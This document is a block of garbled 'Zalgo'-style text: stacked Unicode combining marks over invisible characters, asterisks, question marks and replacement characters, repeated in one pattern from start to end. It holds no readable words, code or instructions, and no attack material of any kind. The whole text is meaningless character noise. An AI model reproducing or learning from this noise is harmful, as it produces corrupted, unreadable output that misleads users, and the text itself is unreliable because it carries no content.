̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̰͓̥̝̣̱͓̳͕̜͚̐̇͗̿̃